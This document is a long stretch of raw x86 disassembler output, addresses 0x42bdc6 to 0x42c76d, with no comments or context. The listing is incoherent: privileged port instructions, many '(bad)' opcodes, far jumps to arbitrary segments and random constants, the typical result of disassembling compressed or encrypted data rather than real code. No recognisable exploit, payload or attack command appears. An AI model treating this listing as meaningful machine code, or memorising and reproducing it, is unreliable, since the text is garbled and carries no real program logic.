  42bdc6:	and    eax,DWORD PTR [ecx]
  42bdc8:	leave  
  42bdc9:	ss in  al,0xf2
  42bdcc:	out    0x58,al
  42bdce:	dec    edx
  42bdcf:	int    0x4f
  42bdd1:	inc    esi
  42bdd2:	neg    DWORD PTR [esp+edx*1-0x76]
  42bdd6:	test   al,ch
  42bdd8:	std    
  42bdd9:	cmp    DWORD PTR [edi],edx
  42bddb:	mov    ecx,0x2031d852
  42bde0:	jp     0x42bdfe
  42bde2:	or     al,ah
  42bde4:	sbb    edx,esp
  42bde6:	je     0x42be54
  42bde8:	cli    
  42bde9:	std    
  42bdea:	imul   esi,esp,0xdf5b2353
  42bdf0:	aad    0xfc
  42bdf2:	nop
  42bdf3:	lds    eax,FWORD PTR [esi]
  42bdf5:	cmp    al,0x23
  42bdf7:	es pop ecx
  42bdf9:	js     0x42be3e
  42bdfb:	add    eax,0x27c9d5b5
  42be00:	test   al,0x1a
  42be02:	nop
  42be03:	jle    0x42bdb6
  42be05:	ficomp DWORD PTR [esi+0x636a4429]
  42be0b:	hlt    
  42be0c:	fwait
  42be0d:	jnp    0x42bd94
  42be0f:	cmp    ebx,DWORD PTR [edi+0xf]
  42be12:	test   DWORD PTR es:[ebx+edi*2],ebx
  42be16:	jmp    0x42be8c
  42be18:	cmp    eax,0xb2abfde5
  42be1d:	inc    edx
  42be1e:	aaa    
  42be1f:	inc    esp
  42be20:	cmp    eax,0x5e1e91d6
  42be25:	sbb    eax,esp
  42be27:	mov    DWORD PTR [edx],ecx
  42be29:	jns    0x42be3e
  42be2b:	sub    esp,DWORD PTR [edi+0x18335e3]
  42be31:	popa   
  42be32:	xor    esp,DWORD PTR [eax-0x14]
  42be35:	mov    ds:0x9bd56b5c,eax
  42be3a:	div    BYTE PTR [eax]
  42be3c:	dec    ebx
  42be3d:	cmp    DWORD PTR [esi+0x72],ebx
  42be40:	loopne 0x42bdd5
  42be42:	jl     0x42be82
  42be44:	push   es
  42be45:	shl    edx,1
  42be47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be48:	sbb    al,0x6c
  42be4a:	div    BYTE PTR [ebx+0x26]
  42be4d:	fdivr  DWORD PTR [ecx]
  42be4f:	out    dx,eax
  42be50:	fsubr  QWORD PTR [esi+ebx*2-0x58086ff5]
  42be57:	inc    ebp
  42be58:	push   ss
  42be59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be5a:	into   
  42be5b:	fsubp  st(6),st
  42be5d:	retf   
  42be5e:	and    cl,dl
  42be60:	push   edi
  42be61:	sub    eax,0x3c47d2a3
  42be66:	sub    edi,DWORD PTR [ecx+0x2b093c57]
  42be6c:	outs   dx,DWORD PTR ds:[esi]
  42be6d:	adc    al,0x52
  42be6f:	xor    BYTE PTR [esi+0x243db150],0x41
  42be76:	arpl   si,cx
  42be78:	sbb    dl,BYTE PTR [ecx+0x7]
  42be7b:	shld   DWORD PTR cs:[edx-0x7a3b6f2e],esi,cl
  42be83:	or     BYTE PTR [eax-0x6b],bl
  42be86:	dec    ebp
  42be87:	or     ecx,DWORD PTR [ebx-0x1e2d8336]
  42be8d:	daa    
  42be8e:	mov    edi,0x5aec
	...
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bf48
  42bf01:	jnp    0x42be8c
  42bf03:	test   ah,bl
  42bf05:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0x20000001
  42bf0d:	fisttp DWORD PTR [edx+0x1]
  42bf10:	fnstsw WORD PTR [edi]
  42bf12:	add    DWORD PTR [esp+ebx*8-0x32606c48],esi
  42bf19:	or     al,0xb5
  42bf1b:	inc    ebx
  42bf1c:	add    DWORD PTR [edi+0x11],edi
  42bf1f:	sbb    bl,BYTE PTR [eax+edx*4-0x34]
  42bf23:	xchg   edi,eax
  42bf24:	(bad)  
  42bf25:	retf   
  42bf26:	rcl    DWORD PTR [edx],1
  42bf28:	mov    ah,al
  42bf2a:	pusha  
  42bf2b:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42bf2d:	nop
  42bf2e:	adc    eax,DWORD PTR [edx-0x3a]
  42bf31:	inc    ebx
  42bf32:	dec    esi
  42bf33:	inc    ecx
  42bf34:	inc    esi
  42bf35:	or     al,0xd0
  42bf37:	push   eax
  42bf38:	mov    eax,0x393277a7
  42bf3d:	push   eax
  42bf3e:	adc    bl,BYTE PTR [edi+eiz*2]
  42bf41:	adc    cl,BYTE PTR fs:[ecx+0x4212c0d2]
  42bf48:	push   esi
  42bf49:	cwde   
  42bf4a:	dec    ecx
  42bf4b:	push   0xffffffff
  42bf4d:	repnz fiadd DWORD PTR [ebp*4+0x30bb799d]
  42bf55:	loop   0x42bfad
  42bf57:	mov    edx,0x3ad5aae6
  42bf5c:	in     al,0xb0
  42bf5e:	inc    ecx
  42bf5f:	(bad)  
  42bf60:	int3   
  42bf61:	mov    cl,0xda
  42bf63:	fcomp  QWORD PTR cs:[edx-0x5c]
  42bf67:	lahf   
  42bf68:	leave  
  42bf69:	and    BYTE PTR [esi+edi*4-0x3c],ch
  42bf6d:	inc    ecx
  42bf6e:	sbb    BYTE PTR [edi+0x52be16e7],dh
  42bf74:	cdq    
  42bf75:	setge  bh
  42bf78:	std    
  42bf79:	xchg   esp,eax
  42bf7a:	jnp    0x42bf98
  42bf7c:	in     eax,dx
  42bf7d:	ss scas al,BYTE PTR es:[edi]
  42bf7f:	call   0x4b935c71
  42bf84:	xor    eax,esi
  42bf86:	adc    esp,DWORD PTR [ebx-0x6f547b]
  42bf8c:	add    al,0x11
  42bf8e:	or     ah,BYTE PTR [edx-0x40ea297e]
  42bf94:	cvtdq2ps xmm1,XMMWORD PTR [esi]
  42bf97:	add    al,0xcc
  42bf99:	bound  esp,QWORD PTR [ebx-0x73a35a35]
  42bf9f:	rcr    al,1
  42bfa1:	stos   BYTE PTR es:[edi],al
  42bfa2:	pusha  
  42bfa3:	inc    edi
  42bfa4:	xchg   ebp,eax
  42bfa5:	je     0x42bf8a
  42bfa7:	imul   ebp,DWORD PTR [ebp-0x40],0xffffff93
  42bfab:	dec    esp
  42bfac:	dec    esi
  42bfad:	cmp    eax,0x90b0dd3e
  42bfb2:	jbe    0x42c018
  42bfb4:	push   esp
  42bfb5:	add    dl,BYTE PTR [ecx+0x47cd0c58]
  42bfbb:	out    0x39,al
  42bfbd:	mov    ds:0x48ea9be8,eax
  42bfc2:	in     al,0x56
  42bfc4:	les    edi,FWORD PTR [edx]
  42bfc6:	dec    esi
  42bfc7:	jp     0x42bfb0
  42bfc9:	or     dh,BYTE PTR [edx-0x63]
  42bfcc:	or     al,BYTE PTR [ecx-0x1f]
  42bfcf:	pop    eax
  42bfd0:	pop    edi
  42bfd1:	mov    ebp,0xb92cc5dc
  42bfd6:	xor    bl,BYTE PTR [eax-0x2e406a21]
  42bfdc:	daa    
  42bfdd:	sub    al,0xc0
  42bfdf:	inc    ecx
  42bfe0:	fisttp QWORD PTR [eax]
  42bfe2:	jmp    0x4a18:0x754e32f0
  42bfe9:	mov    edx,0x143600a1
  42bfee:	xchg   ebp,eax
  42bfef:	(bad)  
  42bff0:	out    0x1f,eax
  42bff2:	clc    
  42bff3:	clc    
  42bff4:	pushf  
  42bff5:	aad    0x62
  42bff7:	rcr    BYTE PTR [edx],1
  42bff9:	clc    
  42bffa:	out    dx,eax
  42bffb:	sbb    al,BYTE PTR [eiz*4+0x79def6f4]
  42c002:	loopne 0x42c04c
  42c004:	(bad)  
  42c005:	jmp    0x8b00:0x2d9a573c
  42c00c:	mov    cl,0x4a
  42c00e:	jne    0x42bf94
  42c010:	sub    BYTE PTR [eax],al
	...
  42c072:	add    BYTE PTR [eax],al
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	push   ss
  42c081:	push   0xd7e12f0b
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0xb1000001
  42c08d:	(bad)  
  42c08e:	int3   
  42c08f:	or     edi,DWORD PTR [ebp+0x2c47aa2]
  42c095:	mov    edx,ecx
  42c097:	(bad)  
  42c098:	in     al,0x2b
  42c09a:	inc    ebp
  42c09b:	fwait
  42c09c:	test   DWORD PTR [edx-0x44bae869],ebp
  42c0a2:	int    0x6e
  42c0a4:	sbb    al,0x55
  42c0a6:	or     BYTE PTR [ecx+ebx*2],al
  42c0a9:	dec    esp
  42c0aa:	mov    ds:0x98c40764,al
  42c0af:	ins    DWORD PTR es:[edi],dx
  42c0b0:	pop    es
  42c0b1:	jmp    0x297d37fd
  42c0b6:	and    ch,BYTE PTR [esi]
  42c0b8:	dec    eax
  42c0b9:	(bad)  
  42c0ba:	sub    ecx,DWORD PTR [edx+0x28efd2be]
  42c0c0:	jns    0x42c0dd
  42c0c2:	mov    DWORD PTR [ecx+0x630de75d],edx
  42c0c8:	or     eax,DWORD PTR [edi-0x6d]
  42c0cb:	(bad)  
  42c0cc:	jne    0x42c0f7
  42c0ce:	mov    ebx,0xe348c43b
  42c0d3:	aad    0x3c
  42c0d5:	jo     0x42c12c
  42c0d7:	mov    ebp,0xbb3775b4
  42c0dc:	push   ebx
  42c0dd:	pop    ebp
  42c0de:	cmp    DWORD PTR [ebx],ebx
  42c0e0:	pop    esp
  42c0e1:	rcl    bl,0xc7
  42c0e4:	ja     0x42c159
  42c0e6:	aaa    
  42c0e7:	jle    0x42c0eb
  42c0e9:	nop
  42c0ea:	push   ecx
  42c0eb:	ins    BYTE PTR es:[edi],dx
  42c0ec:	jmp    0x42c08b
  42c0ee:	inc    eax
  42c0ef:	popa   
  42c0f0:	outs   dx,DWORD PTR ds:[esi]
  42c0f1:	clc    
  42c0f2:	mov    al,0x24
  42c0f4:	jmp    0x30cd:0x78b55d41
  42c0fb:	ss aaa 
  42c0fd:	and    BYTE PTR [edx+0x3eff3533],ch
  42c103:	cld    
  42c104:	sub    esp,eax
  42c106:	mov    ebp,0x4aa3b39
  42c10b:	add    edi,DWORD PTR [ebp-0x5aaf1bb7]
  42c111:	stos   BYTE PTR es:[edi],al
  42c112:	les    ebp,FWORD PTR [ecx+ebx*4+0x47]
  42c116:	or     BYTE PTR [eax],ah
  42c118:	es mov ch,0xf5
  42c11c:	ret    
  42c11d:	add    al,BYTE PTR [ecx+edi*2+0x3f3caf80]
  42c124:	fstp   st(7)
  42c126:	pop    esi
  42c127:	sbb    ah,BYTE PTR [ecx+0x4d745a8c]
  42c12d:	dec    eax
  42c12e:	sub    DWORD PTR [ebx],ecx
  42c130:	stos   DWORD PTR es:[edi],eax
  42c131:	pop    DWORD PTR [ebx+0x13]
  42c134:	add    dl,BYTE PTR [esi-0x4b]
  42c137:	dec    edx
  42c138:	inc    esi
  42c139:	ret    0x8d7d
  42c13c:	sahf   
  42c13d:	fadd   DWORD PTR [edx]
  42c13f:	repnz test DWORD PTR [eax-0x3705f1b6],ebx
  42c146:	int    0xe8
  42c148:	ret    0x723d
  42c14b:	(bad)  
  42c14c:	jae    0x42c13e
  42c14e:	jle    0x42c18b
  42c150:	mov    dl,0x4d
  42c152:	sti    
  42c153:	mov    ah,0x5f
  42c155:	call   0x46c0ff1b
  42c15a:	imul   edi,DWORD PTR ds:0x1efe541a,0xd5291a19
  42c164:	lods   al,BYTE PTR ds:[esi]
  42c165:	dec    edx
  42c166:	in     eax,0x34
  42c168:	or     ch,dl
  42c16a:	outs   dx,BYTE PTR ds:[esi]
  42c16b:	inc    ebx
  42c16c:	in     eax,dx
  42c16d:	fxch   st(5)
  42c16f:	push   esi
  42c170:	and    edx,DWORD PTR [ebx+0xd5279bf]
  42c176:	or     ebx,ebx
  42c178:	hlt    
  42c179:	imul   ecx,esp,0x29
  42c17c:	and    eax,0xde51da05
  42c181:	jle    0x42c19c
  42c183:	in     eax,0x39
  42c185:	jb     0x42c183
  42c187:	(bad)  
  42c188:	cld    
  42c189:	mov    dl,0x9d
  42c18b:	mov    dl,bh
  42c18d:	adc    DWORD PTR [ebx+ebx*4-0x50],ebp
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	lock ret 
  42c202:	inc    edx
  42c203:	sub    esp,esi
  42c205:	fadd   DWORD PTR [ecx]
  42c207:	add    BYTE PTR ds:0x15000001,al
  42c20d:	jae    0x42c200
  42c20f:	aaa    
  42c210:	add    ch,BYTE PTR ds:0xde680854
  42c216:	push   ebx
  42c217:	idiv   DWORD PTR [esi+0x20]
  42c21a:	jl     0x42c270
  42c21c:	hlt    
  42c21d:	xchg   esp,eax
  42c21e:	inc    eax
  42c21f:	int3   
  42c220:	stos   BYTE PTR es:[edi],al
  42c221:	sbb    ch,BYTE PTR ds:0x1af84d28
  42c227:	mov    WORD PTR [ebp-0x56],ds
  42c22a:	outs   dx,DWORD PTR ds:[esi]
  42c22b:	loop   0x42c1cc
  42c22d:	fwait
  42c22e:	daa    
  42c22f:	out    0x66,eax
  42c231:	inc    ebx
  42c232:	cmc    
  42c233:	fldcw  WORD PTR [ebx+0x2228ec25]
  42c239:	je     0x42c284
  42c23b:	adc    al,0x5f
  42c23d:	minps  xmm3,XMMWORD PTR [edi+0xe534340]
  42c244:	iret   
  42c245:	int    0xc9
  42c247:	dec    edi
  42c248:	and    ah,BYTE PTR [eax+0xea222d1]
  42c24e:	rcl    BYTE PTR [edi],cl
  42c250:	pusha  
  42c251:	leave  
  42c252:	inc    edx
  42c253:	inc    ecx
  42c254:	data16 xlat BYTE PTR ds:[ebx]
  42c256:	fwait
  42c257:	lock in eax,dx
  42c259:	mov    bl,dl
  42c25b:	(bad)  
  42c25c:	jbe    0x42c283
  42c25e:	test   eax,0xaf70058
  42c263:	dec    ebp
  42c264:	loopne 0x42c289
  42c266:	mov    ecx,0x1695a1c4
  42c26b:	sbb    dh,BYTE PTR [edx-0x4]
  42c26e:	test   BYTE PTR [eax+ebx*8+0x1e02c60f],bl
  42c275:	gs aam 0xeb
  42c278:	mov    ch,ch
  42c27a:	aad    0xf3
  42c27c:	or     DWORD PTR [ebp-0x2bbf7b9b],ecx
  42c282:	push   ss
  42c283:	lds    ebp,FWORD PTR [esi-0x2da9ddba]
  42c289:	push   eax
  42c28a:	mov    dl,0xbe
  42c28c:	frstor [edx+0x7dd1469b]
  42c292:	xchg   edx,eax
  42c293:	cmp    ah,BYTE PTR [ecx-0x6f]
  42c296:	mov    ebx,0x822cd622
  42c29b:	mov    ebx,0xe539f931
  42c2a0:	push   0xffffffc1
  42c2a2:	sub    al,0xf2
  42c2a4:	sbb    al,0x8f
  42c2a6:	mov    dh,0xba
  42c2a8:	xchg   ecx,eax
  42c2a9:	mov    ah,BYTE PTR [ecx+0x69]
  42c2ac:	sbb    eax,0xe5b76c82
  42c2b1:	popf   
  42c2b2:	push   cs
  42c2b3:	push   edx
  42c2b4:	jbe    0x42c290
  42c2b6:	add    BYTE PTR [eax+0x2],0x98
  42c2ba:	lock inc ebx
  42c2bc:	inc    ebx
  42c2bd:	retf   0xa1d9
  42c2c0:	cmp    eax,0x8a074d85
  42c2c5:	rcl    BYTE PTR [ebp+0x2a933695],cl
  42c2cb:	sub    edi,esp
  42c2cd:	fdivr  QWORD PTR [ecx+ecx*4-0x6c14967a]
  42c2d4:	lods   al,BYTE PTR ds:[esi]
  42c2d5:	jmp    0x2131:0xeea8c4b
  42c2dc:	ds scas eax,DWORD PTR es:[edi]
  42c2de:	jo     0x42c271
  42c2e0:	call   0xc52c:0xfb560feb
  42c2e7:	add    BYTE PTR [edi+0x9],bl
  42c2ea:	pushf  
  42c2eb:	or     eax,0xd6feb683
  42c2f0:	stos   BYTE PTR es:[edi],al
  42c2f1:	mov    BYTE PTR [edx+0x3e],bh
  42c2f4:	scas   eax,DWORD PTR es:[edi]
  42c2f5:	add    DWORD PTR ds:0xb2f4edb1,eax
  42c2fb:	shl    DWORD PTR [eax],1
  42c2fd:	call   0x40a3:0xb62d1348
  42c304:	stc    
  42c305:	outs   dx,BYTE PTR ds:[esi]
  42c306:	add    ebp,DWORD PTR cs:[edx]
  42c309:	pop    eax
  42c30a:	pop    esi
  42c30b:	out    dx,al
  42c30c:	mov    ah,0x4f
  42c30e:	jmp    0x42c373
  42c310:	sbb    BYTE PTR [eax],al
	...
  42c372:	add    BYTE PTR [eax],al
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x47099ff6
  42c383:	jns    0x42c370
  42c385:	fld    DWORD PTR [ecx]
  42c387:	add    BYTE PTR ds:0xbd000001,al
  42c38d:	imul   esp,edi,0x4c
  42c390:	mov    ch,0x3b
  42c392:	out    dx,eax
  42c393:	xchg   esp,eax
  42c394:	push   DWORD PTR [ebx+esi*2+0x57]
  42c398:	xor    dh,BYTE PTR [edi]
  42c39a:	sub    edx,DWORD PTR cs:[ebx+0xcea706]
  42c3a1:	jb     0x42c380
  42c3a3:	test   DWORD PTR [ecx-0x5f],0xde5c7bde
  42c3aa:	dec    ebx
  42c3ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3ac:	jno    0x42c34c
  42c3ae:	xchg   esp,eax
  42c3af:	ins    DWORD PTR es:[edi],dx
  42c3b0:	iret   
  42c3b1:	and    ebx,DWORD PTR [esi+0x1eefda15]
  42c3b7:	aas    
  42c3b8:	rcl    BYTE PTR [ebp+eax*2+0x1e],0xbb
  42c3bd:	je     0x42c3c9
  42c3bf:	push   0x8f6deb35
  42c3c4:	add    BYTE PTR [ecx-0x80],ah
  42c3c7:	and    eax,0x84a3941b
  42c3cc:	lods   eax,DWORD PTR ds:[esi]
  42c3cd:	out    0x1b,eax
  42c3cf:	adc    BYTE PTR [ecx+esi*4-0x52],0xe3
  42c3d4:	mov    ch,0xc7
  42c3d6:	mov    al,0xa5
  42c3d8:	(bad)  
  42c3d9:	pop    edi
  42c3da:	dec    esi
  42c3db:	dec    ebp
  42c3dc:	shr    esi,0xd0
  42c3df:	in     eax,0x39
  42c3e1:	not    edx
  42c3e3:	adc    BYTE PTR [esi],bh
  42c3e5:	mov    edx,DWORD PTR [ecx-0x5]
  42c3e8:	adc    eax,DWORD PTR [ebp+0x39fbddd7]
  42c3ee:	fiadd  DWORD PTR [ecx-0x3a]
  42c3f1:	mov    dl,0x1a
  42c3f3:	jle    0x42c3dd
  42c3f5:	mov    ch,BYTE PTR [ebx]
  42c3f7:	sub    ebp,DWORD PTR [ebp+0x31]
  42c3fa:	aaa    
  42c3fb:	bswap  ebp
  42c3fd:	imul   ebp,DWORD PTR [ebx+0x63],0xffffffe9
  42c401:	or     BYTE PTR [eax],cl
  42c403:	hlt    
  42c404:	cs js  0x42c475
  42c407:	mov    ecx,0xbe021d27
  42c40c:	(bad)  
  42c40d:	jae    0x42c483
  42c40f:	dec    esi
  42c410:	mov    dl,0x73
  42c412:	mov    ecx,0x64ed169a
  42c417:	ds ret 
  42c419:	pop    eax
  42c41a:	inc    esi
  42c41b:	lods   al,BYTE PTR ds:[esi]
  42c41c:	inc    ebp
  42c41d:	push   0xc0a0ccfd
  42c422:	sub    eax,0xa20d8595
  42c427:	in     eax,dx
  42c428:	mov    ah,0xe0
  42c42a:	xchg   edx,eax
  42c42b:	xor    esi,esi
  42c42d:	dec    esi
  42c42e:	loopne 0x42c445
  42c430:	in     eax,0xed
  42c432:	cs (bad) 
  42c435:	xchg   ebp,ecx
  42c437:	in     al,0xb8
  42c439:	push   ds
  42c43a:	pop    ss
  42c43b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c43c:	xor    al,0x59
  42c43e:	push   eax
  42c43f:	push   edx
  42c440:	xchg   ebp,eax
  42c441:	inc    eax
  42c442:	xor    esi,DWORD PTR [edi+0x51]
  42c445:	mov    esp,0x3e65fbce
  42c44a:	clc    
  42c44b:	xor    bh,BYTE PTR [edi-0x1]
  42c44e:	push   cs
  42c44f:	ret    
  42c450:	ss sub eax,0x6b7df78b
  42c456:	rcr    ebx,1
  42c458:	jns    0x42c3fa
  42c45a:	outs   dx,BYTE PTR ds:[esi]
  42c45b:	mov    ah,0x63
  42c45d:	xor    DWORD PTR [ecx-0x5327bc7b],ebx
  42c463:	jecxz  0x42c419
  42c465:	mov    esi,0x61b979c1
  42c46a:	test   eax,0x31367eae
  42c46f:	test   al,0x9d
  42c471:	add    edx,DWORD PTR [ebx-0x52]
  42c474:	cmp    bh,BYTE PTR [ebx-0x344ed9f1]
  42c47a:	out    dx,al
  42c47b:	test   DWORD PTR [ebp-0x60cb9e0d],0xf8cb1d28
  42c485:	pop    ebp
  42c486:	mov    BYTE PTR [edi-0x7687e6ae],bh
  42c48c:	arpl   WORD PTR [ebx-0x67],bx
  42c48f:	lahf   
  42c490:	mov    ebp,0x0
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xbc34,0xa8
  42c502:	enter  0xf062,0xda
  42c506:	add    DWORD PTR [eax],eax
  42c508:	add    eax,0x71000001
  42c50d:	int3   
  42c50e:	sub    esp,DWORD PTR [ebp-0x311fa97b]
  42c514:	cmp    esi,DWORD PTR [ecx]
  42c516:	push   esi
  42c517:	pop    eax
  42c518:	ss xor eax,0x7d415c8e
  42c51e:	test   al,0x47
  42c520:	(bad)  
  42c521:	fadd   st(0),st
  42c523:	or     BYTE PTR [ecx+edi*1],cl
  42c526:	pop    ss
  42c527:	aas    
  42c528:	leave  
  42c529:	jge    0x42c557
  42c52b:	xor    BYTE PTR [edi],dl
  42c52d:	push   ds
  42c52e:	xchg   ecx,eax
  42c52f:	adc    al,0x6f
  42c531:	fisttp DWORD PTR [edx+edi*2+0x51c7127e]
  42c538:	lds    esp,FWORD PTR [edx-0x6e0a7e4b]
  42c53e:	xchg   ebp,eax
  42c53f:	cdq    
  42c540:	add    edi,DWORD PTR [esi-0x6d]
  42c543:	jge    0x42c58d
  42c545:	in     al,0xad
  42c547:	inc    edx
  42c548:	pop    esi
  42c549:	inc    ebp
  42c54a:	cmp    edx,edx
  42c54c:	inc    ecx
  42c54d:	out    0xf9,al
  42c54f:	pop    edx
  42c550:	add    eax,0x694d9cfd
  42c555:	cmp    ch,cl
  42c557:	mov    ebp,eax
  42c559:	or     BYTE PTR [edx+0x22b0543b],0x1f
  42c560:	sub    al,0xfa
  42c562:	imul   BYTE PTR [edx-0x75]
  42c565:	adc    edx,DWORD PTR [edx]
  42c567:	mov    bh,ah
  42c569:	out    dx,eax
  42c56a:	js     0x42c5e8
  42c56c:	add    BYTE PTR [ecx+0x4673d811],bh
  42c572:	mov    edx,0x1c0561c1
  42c577:	cld    
  42c578:	mov    bl,0x1
  42c57a:	pop    ds
  42c57b:	pop    esi
  42c57c:	arpl   WORD PTR [ebx+0x5efa31d3],dx
  42c582:	jnp    0x42c5be
  42c584:	jmp    0xff1f:0x1e4d4031
  42c58b:	xor    eax,0x16f81791
  42c590:	dec    edx
  42c591:	dec    ebx
  42c592:	adc    al,BYTE PTR [edx-0x74]
  42c595:	adc    eax,0x1e4d8336
  42c59a:	cld    
  42c59b:	mov    ebx,0x5a834b68
  42c5a0:	inc    eax
  42c5a1:	not    DWORD PTR [edi+esi*4]
  42c5a4:	(bad)  
  42c5a5:	xchg   ecx,eax
  42c5a6:	jo     0x42c621
  42c5a8:	mov    ds:0x3ed4830f,al
  42c5ad:	lods   eax,DWORD PTR ds:[esi]
  42c5ae:	push   esp
  42c5af:	add    al,0x60
  42c5b1:	hlt    
  42c5b2:	aas    
  42c5b3:	xor    BYTE PTR [ecx-0x4f],dh
  42c5b6:	inc    edx
  42c5b7:	or     BYTE PTR ds:0xf212a24f,0x7f
  42c5be:	out    0xb8,eax
  42c5c0:	js     0x42c5d3
  42c5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5c3:	jmp    FWORD PTR [esp+edi*1-0x7e96411a]
  42c5ca:	fiadd  WORD PTR [ebx+0x3a]
  42c5cd:	xor    BYTE PTR [edx],bh
  42c5cf:	test   DWORD PTR [ebx],esi
  42c5d1:	pop    ss
  42c5d2:	xor    ah,BYTE PTR [ebx+0x42e32395]
  42c5d8:	int    0xd8
  42c5da:	mov    BYTE PTR [edx+eax*1-0x3ba4e278],dh
  42c5e1:	(bad)  
  42c5e2:	xchg   ebp,eax
  42c5e3:	and    al,0xe0
  42c5e5:	cmc    
  42c5e6:	and    eax,0x3711c16
  42c5eb:	gs ss std 
  42c5ee:	enter  0x1717,0xe0
  42c5f2:	mov    esp,0xe97dbc73
  42c5f7:	call   0x83c4c686
  42c5fc:	sub    al,0x65
  42c5fe:	inc    esp
  42c5ff:	pop    eax
  42c600:	adc    ah,bh
  42c602:	(bad)  
  42c603:	(bad)  
  42c605:	fwait
  42c606:	or     edx,ecx
  42c608:	stos   BYTE PTR es:[edi],al
  42c609:	lea    esp,[ecx-0x57]
  42c60c:	pushf  
  42c60d:	sub    DWORD PTR [ebp-0x5b],eax
  42c610:	outs   dx,DWORD PTR ds:[esi]
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x3b6dfc6b]
  42c681:	jbe    0x42c67a
  42c683:	(bad)  
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0xb3000001,al
  42c68d:	pop    ecx
  42c68e:	dec    ecx
  42c68f:	mov    ch,0xbc
  42c691:	push   es
  42c692:	pop    ds
  42c693:	int3   
  42c694:	sbb    al,BYTE PTR [ebx-0x7cf437dc]
  42c69a:	out    0x12,al
  42c69c:	test   eax,0xdacd9e7d
  42c6a1:	imul   eax
  42c6a3:	push   ss
  42c6a4:	jne    0x42c63e
  42c6a6:	xchg   ebx,eax
  42c6a7:	cmp    al,0x47
  42c6a9:	hlt    
  42c6aa:	addr16 or al,0x14
  42c6ad:	inc    eax
  42c6ae:	xchg   edx,eax
  42c6af:	cmc    
  42c6b0:	fcom   DWORD PTR [edx-0x32]
  42c6b3:	xchg   ebx,eax
  42c6b4:	push   ss
  42c6b5:	add    DWORD PTR [ecx+0x13],ebx
  42c6b8:	adc    al,0x9e
  42c6ba:	xchg   eax,ebx
  42c6bc:	mov    eax,0x92aec08b
  42c6c1:	sbb    al,0xc1
  42c6c3:	mov    ss,esp
  42c6c5:	in     eax,0x66
  42c6c7:	add    BYTE PTR [edi-0x5],dl
  42c6ca:	jp     0x42c6ea
  42c6cc:	cmp    BYTE PTR [edx-0x7b350064],dl
  42c6d2:	xchg   esi,eax
  42c6d3:	push   ecx
  42c6d4:	mov    bh,0x8b
  42c6d6:	gs lock std 
  42c6d9:	xor    al,0x3
  42c6db:	arpl   ax,bx
  42c6dd:	daa    
  42c6de:	scas   eax,DWORD PTR es:[edi]
  42c6df:	ficom  WORD PTR [esi]
  42c6e1:	es xor al,0x12
  42c6e4:	cmp    esp,DWORD PTR [edx-0x40788d7e]
  42c6ea:	in     al,0x4c
  42c6ec:	xlat   BYTE PTR ds:[ebx]
  42c6ed:	xchg   BYTE PTR [edx-0x7e],bl
  42c6f0:	jnp    0x42c700
  42c6f2:	sti    
  42c6f3:	jnp    0x42c763
  42c6f5:	jmp    0x42c6e8
  42c6f7:	cs int 0xfb
  42c6fa:	fcom   QWORD PTR [ecx]
  42c6fc:	or     al,0x13
  42c6fe:	jne    0x42c777
  42c700:	std    
  42c701:	stos   DWORD PTR es:[edi],eax
  42c702:	push   ss
  42c703:	dec    edi
  42c704:	add    BYTE PTR [ecx+0x123065bf],cl
  42c70a:	sar    DWORD PTR [edx+0x14509f3c],cl
  42c710:	les    esp,FWORD PTR [ebp-0x6655aa16]
  42c716:	(bad)  
  42c717:	imul   edx,DWORD PTR [eax+0x3f45f169],0xce768959
  42c721:	repnz xlat BYTE PTR ds:[ebx]
  42c723:	inc    edx
  42c724:	add    eax,0xf0fbc700
  42c729:	adc    eax,0xd0a68b4f
  42c72e:	ret    
  42c72f:	xor    al,0x35
  42c731:	xchg   BYTE PTR [eax+0x8],ah
  42c734:	pop    esp
  42c735:	(bad)  
  42c736:	pop    edi
  42c737:	push   0x5e9d5d75
  42c73c:	push   ds
  42c73d:	mul    BYTE PTR [ebp+eiz*2+0x79]
  42c741:	(bad)
  42c744:	and    ebx,ebx
  42c746:	loopne 0x42c6e3
  42c748:	inc    edi
  42c749:	jns    0x42c770
  42c74b:	(bad)  
  42c74c:	retf   0xdd66
  42c74f:	je     0x42c714
  42c751:	pop    esi
  42c752:	jge    0x42c7c1
  42c754:	stc    
  42c755:	mov    dh,0xfa
  42c757:	or     BYTE PTR [ecx-0x40],0xe5
  42c75b:	cwde   
  42c75c:	inc    ecx
  42c75d:	retf   0xc192
  42c760:	xor    edi,DWORD PTR [esi+0x50e06055]
  42c766:	mov    bh,0x8b
  42c768:	loope  0x42c750
  42c76a:	push   edx
  42c76b:	fisttp DWORD PTR [edi]
  42c76d:	imul   esp,ecx,0xffffff82
